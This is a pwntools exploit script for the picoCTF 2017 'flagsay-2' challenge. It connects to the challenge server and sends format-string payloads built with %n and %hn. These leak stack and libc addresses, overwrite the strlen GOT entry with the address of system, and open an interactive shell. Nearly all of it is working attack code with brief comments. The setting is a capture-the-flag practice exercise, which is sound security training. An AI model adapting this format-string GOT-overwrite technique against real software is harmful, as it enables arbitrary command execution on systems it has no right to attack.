from pwn import *

LIBC = './libc.so.6'
#LIBC = '/usr/lib32/libc.so.6'
GOT_STRCHAR = 0x8049980
GOT_STRLEN = 0x8049984  # strlen
GOT_PRINTF = 0x8049970

#p = process('./flagsay-2', env={'LD_PRELOAD': LIBC})
#p = process('./flagsay-2')
p = remote('shell2017.picoctf.com' ,35563)

GDB = """
x/32x $esp
b *0x080486bf
c
"""
#gdb.attach(p, GDB)

elf_data = ELF(LIBC)
printf_offset = elf_data.symbols['printf']
system_offset = elf_data.symbols['system']
strlen_offset = 0x36f20 + printf_offset
info('strlen_offset: '+hex(strlen_offset))
info('system_offset: '+hex(system_offset))

def get_offset_val(i):
    p.sendline("ABC|%{}$p".format(i))
    p.recvuntil("ABC|")
    return p.recvn(10)


# stack addresses; 9, 17, 18, 19, 46...
p.sendline("%9$p %17$p %18$p %19$p %46$p")

#gdb.attach(p, "x/32x $esp")
# plan:
# A:9,B:17,C:18,D:19 stack addresses
# - Leak A, B, C or D
# - write GOT address there
p.sendline("XYZ|%9$p")
p.recvuntil("XYZ|")
stackA = p.recvn(10)
info('Using: '+stackA)


def write_addr(pos, addr):
    info("Writing long address, wait a bit...")
    p.sendline("%{}x%{}$nTOP".format(addr - 129, pos))
    return p.recvuntil("TOP")


def write_addr_2_parts(addr):
    addr_h = (addr) >> 16
    addr_l = (addr) & 0xffff
    info("writing in two parts...")
    p.sendline("%{}x%16$hn%{}x%53$hnTOP".format(addr_l - 129, addr_h - addr_l))
    return p.recvuntil("TOP")


write_addr(9, GOT_STRLEN)
write_addr(17, GOT_STRLEN+2)

for i in [16, 53]:
    info("{}: {}".format(i, get_offset_val(i)))

p.sendline("LOL%16$s")
p.recvuntil("LOL")
strlen_addr = u32(p.recvn(4))
info("strchr_addr: "+hex(strlen_addr))

base = strlen_addr - strlen_offset
system_addr = base + system_offset
info("system_add: "+hex(system_addr))

# override strchr with system
# gdb.attach(p, "disas "+hex(system_addr))
write_addr_2_parts(system_addr)
p.recvline_startswith(" //")
p.interactive()
